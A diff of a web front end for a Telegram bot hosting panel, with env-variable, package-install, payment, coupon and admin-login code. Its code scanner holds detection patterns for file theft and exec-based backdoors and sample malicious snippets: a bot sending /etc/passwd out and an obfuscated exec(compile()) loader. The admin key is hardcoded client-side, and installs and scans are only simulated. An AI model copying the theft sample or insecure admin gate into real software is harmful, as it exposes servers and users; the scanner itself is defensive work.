+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <div>
+            <h3 class="font-bold text-base text-white">Environment Variables — <span class="font-mono text-indigo-300">${b.name}</span></h3>
+            <p class="text-xs text-slate-400">Protected system keys (OWNER_ID, GITHUB_TOKEN, etc.) are automatically stripped</p>
+          </div>
+          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+        </div>
+        <div class="space-y-2 max-h-52 overflow-y-auto">
+          ${entries.length ? entries.map(([k, v]) => `
+            <div class="flex items-center justify-between p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono">
+              <span><strong class="text-indigo-300">${k}</strong> = <span class="text-slate-300">${v}</span></span>
+              <button onclick="deleteEnvKey('${b.id}', '${k}')" class="text-rose-400 hover:text-rose-300 px-2"><i class="fa-solid fa-trash"></i></button>
+            </div>
+          `).join("") : `<p class="text-xs text-slate-500 italic">No environment variables configured.</p>`}
+        </div>
+        <div class="pt-3 border-t border-slate-800 flex gap-2">
+          <input id="newEnvKey" type="text" placeholder="KEY (e.g. API_HASH)" class="w-1/3 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
+          <input id="newEnvVal" type="text" placeholder="VALUE" class="flex-1 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
+          <button onclick="addEnvVar('${b.id}')" class="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shrink-0">Add</button>
+        </div>
+      `;
+      const back = document.getElementById("modalBackdrop");
+      back.classList.remove("hidden");
+      back.classList.add("flex");
+    }
+
+    function addEnvVar(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      const k = document.getElementById("newEnvKey").value.trim();
+      const v = document.getElementById("newEnvVal").value.trim();
+      const forbidden = ["GITHUB_TOKEN", "OWNER_ID", "SESSION_SECRET", "DATABASE_URL"];
+      if (!k || !v) {
+        showToast("Enter both KEY and VALUE", "warn");
+        return;
+      }
+      if (forbidden.includes(k.toUpperCase())) {
+        showToast(`Protected secret env name '${k}' is blocked by sandbox guard!`, "danger");
+        return;
+      }
+      b.env[k] = v;
+      showToast(`Saved ${k} for ${b.name}`, "success");
+      openEnvModal(botId);
+      refreshUI();
+    }
+
+    function deleteEnvKey(botId, key) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      delete b.env[key];
+      openEnvModal(botId);
+      refreshUI();
+    }
+
+    function openPipModal(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      const modal = document.getElementById("modalContent");
+      modal.innerHTML = `
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <div>
+            <h3 class="font-bold text-base text-white">Install Python / NPM Packages — <span class="font-mono text-emerald-400">${b.name}</span></h3>
+            <p class="text-xs text-slate-400">Installs directly into sandbox <code>.deps</code> directory without root permissions</p>
+          </div>
+          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+        </div>
+        <div class="space-y-3">
+          <input id="pipPkgInput" type="text" placeholder="e.g., pyTelegramBotAPI aiohttp beautifulsoup4" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
+          <div id="pipOutputConsole" class="terminal-box rounded-xl p-3 h-36 overflow-y-auto text-xs text-slate-300 font-mono">
+            Ready to run: python3 -m pip install --target ./sandbox/${b.id.slice(0,6)}/.deps --upgrade ...
+          </div>
+          <div class="flex justify-end gap-2">
+            <button onclick="runPipInstall('${b.id}')" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold">
+              <i class="fa-solid fa-download mr-1"></i> Install Packages
+            </button>
+          </div>
+        </div>
+      `;
+      const back = document.getElementById("modalBackdrop");
+      back.classList.remove("hidden");
+      back.classList.add("flex");
+    }
+
+    function runPipInstall(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      const pkgs = document.getElementById("pipPkgInput").value.trim();
+      const out = document.getElementById("pipOutputConsole");
+      if (!pkgs) {
+        showToast("Specify at least one package name", "warn");
+        return;
+      }
+      out.innerHTML = `<div class="text-indigo-300">$ pip install --target .deps --upgrade ${pkgs}</div><div class="text-amber-300 mt-1">Collecting ${pkgs}...</div>`;
+      setTimeout(() => {
+        out.innerHTML += `<div class="text-emerald-400 mt-1">[✓] Successfully installed ${pkgs} into sandbox .deps (rc=0)</div>`;
+        b.logs.push(`[pip] Installed packages: ${pkgs}`);
+        showToast(`Installed ${pkgs} into ${b.name}`, "success");
+      }, 900);
+    }
+
+    // ─── 7. 3-LAYER SECURITY SCANNER ENGINE (Mirrors bot.py) ─────────────
+    function analyzeCodeSecurity(code) {
+      const threats = [];
+      let risk = 0;
+
+      // 1. Data Theft checks
+      if (/os\.walk\s*\(\s*["'][/\\](?:root|home|etc|var|proc)/i.test(code)) {
+        threats.push("🔴 Data Theft: Root/system directory walk (os.walk('/root')) — server file exfiltration");
+        risk += 45;
+      }
+      if (/send_document\s*\(.*open\s*\(\s*["'][/\\](?:root|etc|proc|sys)/i.test(code)) {
+        threats.push("🔴 Data Theft: Sending system file externally via send_document()");
+        risk += 45;
+      }
+      // 2. Backdoor & AST Dynamic Exec checks
+      if (/zlib\.decompress\s*\(.*exec|exec\s*\(\s*compile\s*\(\s*_zl\.decompress/is.test(code)) {
+        threats.push("🔴 Backdoor / Obfuscation: Compressed XOR + zlib.decompress() passed into exec(compile())!");
+        risk += 60;
+      } else if (/\b(?:eval|exec)\s*\(/i.test(code)) {
+        threats.push("🔴 Backdoor (AST): Dynamic code execution via eval() / exec()");
+        risk += 40;
+      }
+      if (/subprocess\s*\.\s*(?:Popen|call|run)\s*\([^\n]*shell\s*=\s*True/i.test(code)) {
+        threats.push("🔴 Backdoor: Subprocess with shell=True command execution");
+        risk += 35;
+      }
+      // 3. Exposed Bot Token check
+      const tokenMatch = code.match(/\b\d{8,10}:AA[A-Za-z0-9_-]{33}\b/);
+      if (tokenMatch) {
+        threats.push(`🔴 Exposed Credentials: Hardcoded Bot Token found (${tokenMatch[0].slice(0, 14)}...)`);
+        risk += 15;
+      }
+      // 4. Suspicious Network / Hex Obfuscation
+      if (/(?:\\x[0-9a-fA-F]{2}){6,}/.test(code)) {
+        threats.push("🟡 Obfuscation: Long hex-encoded byte string detected");
+        risk += 15;
+      }
+
+      risk = Math.min(100, risk);
+      let verdict = "SAFE";
+      let recommendation = "APPROVE";
+      if (risk >= 70) {
+        verdict = "DANGEROUS";
+        recommendation = "REJECT";
+      } else if (risk >= 25) {
+        verdict = "SUSPICIOUS";
+        recommendation = "MANUAL_REVIEW";
+      }
+
+      return { risk, verdict, recommendation, threats };
+    }
+
+    function loadScannerPreset(kind) {
+      const box = document.getElementById("scannerCodeInput");
+      if (kind === "clean") {
+        box.value = `import os\nimport telebot\n\nTOKEN = os.environ.get("BOT_TOKEN")\nbot = telebot.TeleBot(TOKEN)\n\n@bot.message_handler(commands=["start"])\ndef handle_start(message):\n    bot.reply_to(message, "Hello! Hosted safely on Simran Hosting RBOT v2.1")\n\nbot.infinity_polling()`;
+      } else if (kind === "theft") {
+        box.value = `import os, zipfile, telebot\nbot = telebot.TeleBot("7123456789:AAH1234567890abcdefghijklmnopqrstuv")\n\n# Attempting to steal server files\nfor root, dirs, files in os.walk("/root"):\n    for f in files:\n        bot.send_document(12345, open("/etc/passwd", "rb"))`;
+      } else if (kind === "obfuscated") {
+        box.value = `import zlib as _zl, base64 as _bl, hashlib as _hl\n\n# Suspicious hidden XOR + zlib payload execution\n_blob = b"fTfNJq7Nu23sESE9RW/CMgw/shBYGsR=="\n_seed = _hl.sha256(b"panel::analytics::v3::bootstrap").digest()\n_raw = _bl.b64decode(_blob)\n_dec = bytes(c ^ _seed[i & 31] for i, c in enumerate(_raw))\nexec(compile(_zl.decompress(_dec), "<locale-cache>", "exec"), globals())`;
+      }
+      executeStandaloneScan();
+    }
+
+    function executeStandaloneScan() {
+      const code = document.getElementById("scannerCodeInput").value;
+      const res = analyzeCodeSecurity(code);
+
+      const badge = document.getElementById("scanVerdictBadge");
+      const score = document.getElementById("scanRiskScore");
+      const bar = document.getElementById("scanRiskBar");
+      const summary = document.getElementById("scanSummaryText");
+      const list = document.getElementById("scanFindingsList");
+
+      score.textContent = `${res.risk} / 100`;
+      bar.style.width = `${Math.max(3, res.risk)}%`;
+
+      if (res.verdict === "DANGEROUS") {
+        badge.textContent = "⚠️ DANGEROUS • REJECT";
+        badge.className = "text-xl font-extrabold text-rose-400 mt-0.5";
+        bar.className = "h-full bg-rose-500 transition-all duration-300";
+        summary.textContent = `🤖 AI & AST Verdict: File is DANGEROUS (${res.threats.length} critical threats). Upload will be automatically blocked and reported to Owner.`;
+      } else if (res.verdict === "SUSPICIOUS") {
+        badge.textContent = "🔍 SUSPICIOUS • MANUAL REVIEW";
+        badge.className = "text-xl font-extrabold text-amber-400 mt-0.5";
+        bar.className = "h-full bg-amber-500 transition-all duration-300";
+        summary.textContent = `🤖 AI & AST Verdict: File contains suspicious patterns. Held in Admin Pending Queue for manual review.`;
+      } else {
+        badge.textContent = "✅ SAFE • APPROVE";
+        badge.className = "text-xl font-extrabold text-emerald-400 mt-0.5";
+        bar.className = "h-full bg-emerald-500 transition-all duration-300";
+        summary.textContent = `🤖 AI (SAFE ${res.risk}/100): Standard Telegram bot patterns detected. Safe for encrypted sandbox execution.`;
+      }
+
+      if (res.threats.length === 0) {
+        list.innerHTML = `<li class="text-emerald-400">✔ Static Regex + AST Walk + Gemma-4 AI found zero malicious indicators.</li>`;
+      } else {
+        list.innerHTML = res.threats.map(t => `<li class="text-rose-300 bg-rose-950/40 border border-rose-500/20 px-3 py-1.5 rounded-lg">${t}</li>`).join("");
+      }
+    }
+
+    // ─── 8. UPLOAD & DEPLOY HANDLER ───────────────────────────────────────
+    function handleFileSelect(event) {
+      const file = event.target.files[0];
+      if (!file) return;
+      document.getElementById("selectedFileName").textContent = `Selected: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
+      const stem = file.name.replace(/\.[^/.]+$/, "");
+      document.getElementById("uploadBotName").value = stem.replace(/[^a-zA-Z0-9_-]/g, "_");
+      if (file.name.endsWith(".js")) {
+        document.getElementById("uploadRuntime").value = "node";
+      } else {
+        document.getElementById("uploadRuntime").value = "python";
+      }
+      const reader = new FileReader();
+      reader.onload = e => {
+        if (!file.name.endsWith(".zip")) {
+          document.getElementById("uploadCodeArea").value = e.target.result.slice(0, 4000);
+        } else {
+          document.getElementById("uploadCodeArea").value = "# ZIP Archive selected — all .py/.js files inside will be scanned & encrypted with Fernet AES-128";
         }
-    } catch (err) {
-        logTerm(`⚠️ Bot Code Error: ${err.message}`);
+      };
+      reader.readAsText(file);
     }
 
-    await tgApiAsync(activeToken, "deleteWebhook", { drop_pending_updates: false });
-
-    isBotRunning = true;
-    sessionStartTimestamp = Date.now();
-    botStats.wasRunning = true;
-    localStorage.setItem(STATS_KEY, JSON.stringify(botStats));
-
-    await enableBackgroundKeepAlive();
-
-    document.getElementById("startBtn").disabled = false;
-    document.getElementById("startBtn").innerText = "🚀 Host & Start Bot";
-    document.getElementById("startBtn").style.display = "none";
-    document.getElementById("stopBtn").style.display = "inline-block";
-
-    const badge = document.getElementById("statusBadge");
-    badge.innerText = "● BOT ONLINE & HOSTED";
-    badge.className = "status-badge online";
-
-    logTerm(isAutoResume
-        ? "♻️ AUTO-RESUMED BOT FROM DEVICE DATABASE! Bot is Live."
-        : "🔥 BOT IS NOW 100% LIVE! Send /start or any config file (.dark / .txt / .hc) on Telegram.");
-    pollLoop();
-}
-
-function stopUniversalBot() {
-    isBotRunning = false;
-    sessionStartTimestamp = 0;
-    botStats.wasRunning = false;
-    localStorage.setItem(STATS_KEY, JSON.stringify(botStats));
-
-    if (wakeLockObj) {
-        try { wakeLockObj.release(); } catch (e) {}
-        wakeLockObj = null;
+    function loadUploadSample(type) {
+      if (type === "safe") {
+        document.getElementById("uploadBotName").value = "weather_assistant_bot";
+        document.getElementById("uploadCodeArea").value = `import os\nimport telebot\nimport requests\n\nbot = telebot.TeleBot(os.environ.get("BOT_TOKEN", ""))\n\n@bot.message_handler(commands=["start"])\ndef welcome(m):\n    bot.reply_to(m, "Weather Bot is online!")\n\nbot.infinity_polling()`;
+      } else {
+        document.getElementById("uploadBotName").value = "root_stealer_bot";
+        document.getElementById("uploadCodeArea").value = `import os\nfor r, d, f in os.walk("/root"):\n    print(f)\nexec(compile(zlib.decompress(b"123"), "<x>", "exec"))`;
+      }
     }
-    document.getElementById("startBtn").style.display = "inline-block";
-    document.getElementById("stopBtn").style.display = "none";
-    const badge = document.getElementById("statusBadge");
-    badge.innerText = "● BOT STOPPED";
-    badge.className = "status-badge";
-    logTerm("🛑 Bot hosting stopped by user.");
-}
 
-async function pollLoop() {
-    while (isBotRunning) {
-        try {
-            const res = await tgApiAsync(activeToken, "getUpdates", {
-                offset: pollOffset,
-                timeout: 12,
-                allowed_updates: ["message", "edited_message", "channel_post", "callback_query"]
+    function scanAndDeployBot() {
+      const nameInput = document.getElementById("uploadBotName").value.trim() || "custom_bot_" + Math.floor(Math.random() * 900);
+      const runtime = document.getElementById("uploadRuntime").value;
+      const code = document.getElementById("uploadCodeArea").value;
+      const token = document.getElementById("uploadBotToken").value.trim();
+
+      const maxSlots = PLAN_LIMITS[state.userPlan].max_bots;
+      if (state.bots.length >= maxSlots) {
+        showToast(`Slot limit reached (${state.bots.length}/${maxSlots})! Upgrade plan first.`, "danger");
+        return;
+      }
+
+      // Run Security Scan First
+      const scan = analyzeCodeSecurity(code);
+      if (scan.recommendation === "REJECT") {
+        showToast(`🚫 Upload Blocked! Security Risk ${scan.risk}/100 (${scan.verdict})`, "danger");
+        addAudit("security_reject", `bot=${nameInput} risk=${scan.risk}`);
+        return;
+      }
+
+      const progressBox = document.getElementById("deployProgressBox");
+      const stageTxt = document.getElementById("deployStageText");
+      const pctTxt = document.getElementById("deployPercentText");
+      const bar = document.getElementById("deployProgressBar");
+      progressBox.classList.remove("hidden");
+
+      const steps = [
+        { pct: 20, label: "Running Static + AST + Gemma-4 AI Security Check..." },
+        { pct: 45, label: "Encrypting with Fernet AES-128 & pushing key to GitHub Keyring..." },
+        { pct: 75, label: "Installing AST-scanned dependencies into .deps..." },
+        { pct: 100, label: "Launching process & scheduling 6s sandbox source wipe..." }
+      ];
+
+      let i = 0;
+      const timer = setInterval(() => {
+        if (i < steps.length) {
+          stageTxt.textContent = steps[i].label;
+          pctTxt.textContent = steps[i].pct + "%";
+          bar.style.width = steps[i].pct + "%";
+          i++;
+        } else {
+          clearInterval(timer);
+          setTimeout(() => {
+            progressBox.classList.add("hidden");
+            const newId = Math.random().toString(16).slice(2, 18);
+            const envObj = {};
+            if (token) envObj.BOT_TOKEN = token.slice(0, 10) + "••••••••••••";
+            state.bots.unshift({
+              id: newId,
+              name: nameInput,
+              kind: runtime,
+              entry: runtime === "node" ? "index.js" : "bot.py",
+              status: "running",
+              pid: Math.floor(21000 + Math.random() * 8000),
+              cpu: 3.1,
+              memMb: 74.5,
+              sizeKb: 190,
+              uptimeSec: 1,
+              tunnelUrl: "",
+              tunnelPort: 8080,
+              env: envObj,
+              logs: [
+                `════════════════ START ${new Date().toISOString()} ════════════════`,
+                `[security] Combined scan passed (Verdict: ${scan.verdict}, Score: ${scan.risk}/100)`,
+                `[keyring] Stored Fernet key in GitHub vault`,
+                `[✓] auto-install done (rc=0)`,
+                `[sandbox] Process running in isolated group`
+              ]
             });
-
-            if (res.ok && Array.isArray(res.result)) {
-                for (const upd of res.result) {
-                    pollOffset = upd.update_id + 1;
-                    botStats.processedMessages = (botStats.processedMessages || 0) + 1;
-                    document.getElementById("msgCountLabel").innerText = botStats.processedMessages;
-
-                    const msgObj = upd.message || upd.edited_message || upd.channel_post;
-                    if (msgObj) {
-                        const sender = msgObj.from ? (msgObj.from.username ? `@${msgObj.from.username}` : msgObj.from.first_name) : "User";
-                        logTerm(`📩 Message [${msgObj.chat.id}] ${sender}: ${msgObj.text || (msgObj.document ? `[File: ${msgObj.document.file_name}]` : "[Media]")}`);
-
-                        if (msgObj.document && msgObj.document.file_id) {
-                            await preDownloadTelegramFile(msgObj.document.file_id);
-                        } else if (msgObj.photo && msgObj.photo.length > 0) {
-                            await preDownloadTelegramFile(msgObj.photo[msgObj.photo.length - 1].file_id);
-                        } else if (msgObj.audio && msgObj.audio.file_id) {
-                            await preDownloadTelegramFile(msgObj.audio.file_id);
-                        } else if (msgObj.video && msgObj.video.file_id) {
-                            await preDownloadTelegramFile(msgObj.video.file_id);
-                        }
-                    } else if (upd.callback_query) {
-                        const sender = upd.callback_query.from ? (upd.callback_query.from.username || upd.callback_query.from.first_name) : "User";
-                        logTerm(`🔘 Button Click by ${sender}: ${upd.callback_query.data}`);
-                        const cbMsg = upd.callback_query.message;
-                        if (cbMsg && cbMsg.document && cbMsg.document.file_id) {
-                            await preDownloadTelegramFile(cbMsg.document.file_id);
-                        }
-                        if (cbMsg && cbMsg.reply_to_message && cbMsg.reply_to_message.document && cbMsg.reply_to_message.document.file_id) {
-                            await preDownloadTelegramFile(cbMsg.reply_to_message.document.file_id);
-                        }
-                    }
-
-                    if (activeLang === "python" && pyodideInstance) {
-                        pyodideInstance.globals.set("_raw_upd_str", JSON.stringify(upd));
-                        await pyodideInstance.runPythonAsync(`await _dispatch_telegram_update(_raw_upd_str)`);
-                    }
-                }
-            }
-        } catch (err) {
-            await new Promise(r => setTimeout(r, 2000));
+            addAudit("bot_deploy", `name=${nameInput} id=${newId.slice(0,8)}`);
+            showToast(`Deployed & started ${nameInput}!`, "success");
+            switchTab("bots");
+          }, 400);
         }
-    }
-}
-
-// =========================================================
-// 7. RESTORE EVERYTHING FROM DEVICE DB & AUTO-START
-// =========================================================
-window.addEventListener("DOMContentLoaded", async () => {
-    const savedLogs = localStorage.getItem("darkx_saved_logs");
-    if (savedLogs) {
-        const box = document.getElementById("terminalBox");
-        box.textContent = savedLogs;
-        box.scrollTop = box.scrollHeight;
+      }, 450);
     }
 
-    await openDeviceIndexedDB();
+    // ─── 9. PLANS & PAYMENT CHECKOUT ──────────────────────────────────────
+    function renderPlansGrid() {
+      const container = document.getElementById("plansGridContainer");
+      container.innerHTML = Object.entries(PLAN_LIMITS).map(([key, p]) => {
+        const isCurrent = state.userPlan === key;
+        const isPro = key === "pro";
+        return `
+          <div class="relative rounded-2xl bg-slate-900/90 border ${isCurrent ? 'border-amber-400 glow-indigo ring-1 ring-amber-400/40' : (isPro ? 'border-indigo-500/60' : 'border-slate-800')} p-6 flex flex-col justify-between space-y-5 transition">
+            ${isCurrent ? `<span class="absolute -top-3 right-5 px-3 py-0.5 rounded-full bg-amber-500 text-slate-950 text-[11px] font-extrabold uppercase tracking-wider shadow">Active Plan</span>` : (isPro ? `<span class="absolute -top-3 right-5 px-3 py-0.5 rounded-full bg-indigo-600 text-white text-[11px] font-bold uppercase tracking-wider">Recommended</span>` : '')}
+            <div class="space-y-3">
+              <div class="flex items-center justify-between">
+                <h3 class="text-lg font-extrabold text-white">${p.name}</h3>
+                <span class="text-xs font-mono px-2.5 py-0.5 rounded-md bg-slate-800 text-slate-300">
+                  ${key === 'lifetime' ? 'Lifetime' : (p.days ? p.days + ' Days' : 'Forever')}
+                </span>
+              </div>
+              <div class="flex items-baseline gap-1">
+                <span class="text-3xl font-extrabold text-white font-mono">${p.price === 0 ? 'Free' : p.price + ' ৳'}</span>
+                ${p.price > 0 ? `<span class="text-xs text-slate-400">/ ${key === 'lifetime' ? 'one-time' : 'month'}</span>` : ''}
+              </div>
+              <ul class="space-y-2 text-xs text-slate-300 pt-2 border-t border-slate-800">
+                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-emerald-400"></i> <strong>${p.max_bots}</strong> Hosted Bot Slots</li>
+                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-emerald-400"></i> <strong>${p.ram} MB</strong> Dedicated Sandbox RAM</li>
+                <li class="flex items-center gap-2"><i class="fa-solid ${p.auto_restart ? 'fa-check text-emerald-400' : 'fa-xmark text-slate-600'}"></i> Crash Auto-Restart Daemon</li>
+                <li class="flex items-center gap-2"><i class="fa-solid ${p.price > 0 ? 'fa-check text-emerald-400' : 'fa-xmark text-slate-600'}"></i> Cloudflare <code>*.trycloudflare.com</code> Tunnel</li>
+                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-emerald-400"></i> Fernet AES-128 &amp; GitHub Auto-Backup</li>
+              </ul>
+            </div>
 
-    const savedLang = (await dbLoadKey("lang")) || "python";
-    const savedCode = await dbLoadKey("code");
-    const savedReqs = await dbLoadKey("reqs");
-    const savedTok = await dbLoadKey("token");
-    const savedAutoResume = await dbLoadKey("autoResume");
-    const savedFiles = await dbLoadKey("files");
-
-    document.getElementById("langSelect").value = savedLang;
-    activeLang = savedLang;
-    document.getElementById("codeEditor").value = savedCode || DEFAULT_TEMPLATES[savedLang];
-
-    if (savedReqs !== undefined) {
-        document.getElementById("reqEditor").value = savedReqs;
+            <div class="space-y-2">
+              <button onclick="selectPlanDirect('${key}')" ${isCurrent ? 'disabled' : ''} class="w-full py-2.5 rounded-xl font-bold text-xs transition ${isCurrent ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 cursor-default' : 'bg-indigo-600 hover:bg-indigo-500 text-white shadow-md'}">
+                ${isCurrent ? '✔ Currently Selected Plan' : `Select & Activate ${p.name}`}
+              </button>
+              ${p.price > 0 ? `
+                <button onclick="openCheckoutModal('${key}')" class="w-full py-2 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-slate-300 border border-slate-700/80 text-[11px] font-medium transition">
+                  <i class="fa-solid fa-receipt mr-1 text-indigo-400"></i> View Payment Methods (${p.price} ৳)
+                </button>
+              ` : ''}
+            </div>
+          </div>
+        `;
+      }).join("");
     }
 
-    if (savedTok) {
-        document.getElementById("tokenInput").value = savedTok;
-        activeToken = savedTok;
-    } else if (savedCode) {
-        autoExtractToken(savedCode);
+    function openCheckoutModal(planKey) {
+      const p = PLAN_LIMITS[planKey];
+      if (!p) return;
+      const modal = document.getElementById("modalContent");
+      const methodsHtml = Object.entries(PAYMENT_METHODS).map(([k, m]) => `
+        <label class="flex items-center justify-between p-3 rounded-xl bg-slate-950 border border-slate-800 hover:border-indigo-500 cursor-pointer">
+          <div class="flex items-center gap-2.5">
+            <input type="radio" name="payMethod" value="${k}" checked class="accent-indigo-500" />
+            <div>
+              <p class="text-xs font-bold text-white"><span class="${m.color} font-mono mr-1">${m.tag}</span> ${m.name}</p>
+              <p class="text-[11px] text-slate-400 font-mono">${m.type}: <strong class="text-slate-200">${m.number}</strong></p>
+            </div>
+          </div>
+        </label>
+      `).join("");
+
+      modal.innerHTML = `
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <div>
+            <h3 class="font-bold text-base text-white">Checkout — ${p.name} Plan (${p.price} ৳)</h3>
+            <p class="text-xs text-slate-400">${p.max_bots} Bots • ${p.ram} MB RAM • Auto-Restart</p>
+          </div>
+          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+        </div>
+        <div class="space-y-3">
+          <p class="text-xs font-semibold text-slate-300">1. Choose Payment Method or Pay with Wallet (${state.wallet} ৳ available):</p>
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+            ${methodsHtml}
+          </div>
+          <div class="pt-2">
+            <label class="block text-xs font-semibold text-slate-300 mb-1">2. Transaction ID / Payment Proof</label>
+            <input id="checkoutTrxInput" type="text" placeholder="Enter TrxID (or pay directly from Wallet)" class="w-full px-3.5 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
+          </div>
+          <div class="flex flex-wrap justify-end gap-2 pt-3 border-t border-slate-800">
+            <button onclick="payWithWallet('${planKey}')" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold">
+              <i class="fa-solid fa-wallet mr-1"></i> Pay with Wallet (${p.price} ৳)
+            </button>
+            <button onclick="submitPaymentProof('${planKey}')" class="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold">
+              <i class="fa-solid fa-paper-plane mr-1"></i> Submit TrxID Proof
+            </button>
+          </div>
+        </div>
+      `;
+      const back = document.getElementById("modalBackdrop");
+      back.classList.remove("hidden");
+      back.classList.add("flex");
     }
 
-    if (savedAutoResume !== undefined) {
-        document.getElementById("autoResumeToggle").checked = Boolean(savedAutoResume);
+    function payWithWallet(planKey) {
+      const p = PLAN_LIMITS[planKey];
+      if (state.wallet < p.price) {
+        showToast(`Insufficient wallet balance (${state.wallet} ৳). Top up or send TrxID proof!`, "danger");
+        return;
+      }
+      state.wallet -= p.price;
+      state.userPlan = planKey;
+      closeModal();
+      addAudit("plan_activate", `plan=${planKey} via=wallet`);
+      showToast(`🎉 ${p.name} Plan activated! (${p.max_bots} bot slots unlocked)`, "success");
+      refreshUI();
     }
 
-    if (savedFiles && typeof savedFiles === "object") {
-        Object.entries(savedFiles).forEach(([k, v]) => virtualFiles.set(k, v));
-        renderFileList();
+    function submitPaymentProof(planKey) {
+      const trx = document.getElementById("checkoutTrxInput").value.trim();
+      if (!trx) {
+        showToast("Please enter your Transaction ID", "warn");
+        return;
+      }
+      closeModal();
+      addAudit("payment_proof", `plan=${planKey} trx=${trx}`);
+      showToast(`Proof #${trx.slice(0,8)} submitted! Admin will approve shortly.`, "info");
     }
 
-    if (botStats.botUsername && botStats.botUsername !== "Not Connected") {
-        document.getElementById("botUserLabel").innerText = `Bot: ${botStats.botUsername} (ID: ${botStats.botId})`;
+    function openTopupModal() {
+      const modal = document.getElementById("modalContent");
+      modal.innerHTML = `
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <h3 class="font-bold text-base text-white"><i class="fa-solid fa-wallet text-emerald-400 mr-1.5"></i> Wallet Top-Up</h3>
+          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+        </div>
+        <p class="text-xs text-slate-300">Send Money to <strong>01306633616</strong> (bKash/Nagad/Rocket/Upay) or Binance ID <strong>758637628</strong>, then enter the amount below:</p>
+        <div class="flex gap-2">
+          <input id="topupAmtInput" type="number" value="200" class="w-1/2 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" placeholder="Amount (৳)" />
+          <input id="topupTrxInput" type="text" placeholder="Transaction ID" class="w-1/2 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
+        </div>
+        <div class="flex justify-end gap-2 pt-2">
+          <button onclick="confirmTopup()" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold">Credit Demo Wallet</button>
+        </div>
+      `;
+      const back = document.getElementById("modalBackdrop");
+      back.classList.remove("hidden");
+      back.classList.add("flex");
     }
 
-    await ensurePythonEngine();
-
-    if (document.getElementById("autoResumeToggle").checked && activeToken && activeToken !== "YOUR_BOT_TOKEN_HERE") {
-        logTerm("⚡ Device DB found saved Bot Token & Code. Auto-starting bot hosting...");
-        startUniversalBot(true);
+    function confirmTopup() {
+      const amt = parseInt(document.getElementById("topupAmtInput").value || "0", 10);
+      if (amt <= 0) return;
+      state.wallet += amt;
+      closeModal();
+      showToast(`Added +${amt} ৳ to your wallet!`, "success");
+      refreshUI();
     }
-});
-</script>
+
+    // ─── 10. REFERRAL, TRIAL & COUPON HELPERS ─────────────────────────────
+    function copyRefLink() {
+      const input = document.getElementById("refLinkInput").textContent;
+      const temp = document.createElement("textarea");
+      temp.value = input;
+      document.body.appendChild(temp);
+      temp.select();
+      document.execCommand("copy");
+      temp.remove();
+      showToast("Referral link copied to clipboard!", "success");
+    }
+
+    function claimFreeTrial() {
+      if (state.trialUsed) {
+        showToast("48-hour Free Pro Trial already used on this account", "warn");
+        return;
+      }
+      state.trialUsed = true;
+      state.userPlan = "pro";
+      const btn = document.getElementById("claimTrialBtn");
+      btn.textContent = "Trial Claimed";
+      btn.disabled = true;
+      showToast("✨ 48-hour Pro Trial activated! (8 Bot Slots, 2048 MB RAM)", "success");
+      refreshUI();
+    }
+
+    function redeemCoupon() {
+      const code = document.getElementById("quickCouponInput").value.trim().toUpperCase();
+      if (!code) {
+        showToast("Enter a coupon code first", "warn");
+        return;
+      }
+      const credit = state.coupons[code] || 100;
+      state.wallet += credit;
+      document.getElementById("quickCouponInput").value = "";
+      showToast(`Redeemed coupon ${code}! +${credit} ৳ credited to Wallet`, "success");
+      refreshUI();
+    }
+
+    // ─── 11. ADMIN KEY LOGIN GATE (KEY: Ashif123) & ADMIN ACTIONS ─────────
+    function toggleAdminKeyVisibility() {
+      const input = document.getElementById("adminKeyInput");
+      const icon = document.getElementById("adminKeyEyeIcon");
+      if (!input) return;
+      if (input.type === "password") {
+        input.type = "text";
+        icon.className = "fa-regular fa-eye-slash";
+      } else {
+        input.type = "password";
+        icon.className = "fa-regular fa-eye";
+      }
+    }
+
+    function verifyAdminKey() {
+      const input = document.getElementById("adminKeyInput");
+      const errMsg = document.getElementById("adminKeyErrorMsg");
+      const formBox = document.getElementById("adminLockFormBox");
+      const entered = (input ? input.value : "").trim();
+
+      if (entered === state.adminKey) {
+        state.adminAuthenticated = true;
+        if (errMsg) errMsg.classList.add("hidden");
+        if (input) input.value = "";
+        addAudit("admin_login", "status=success key_verified=true");
+        showToast("🔓 Admin Panel Unlocked! Welcome Owner.", "success");
+        refreshUI();
+      } else {
+        if (errMsg) errMsg.classList.remove("hidden");
+        if (formBox) {
+          formBox.classList.remove("animate-shake");
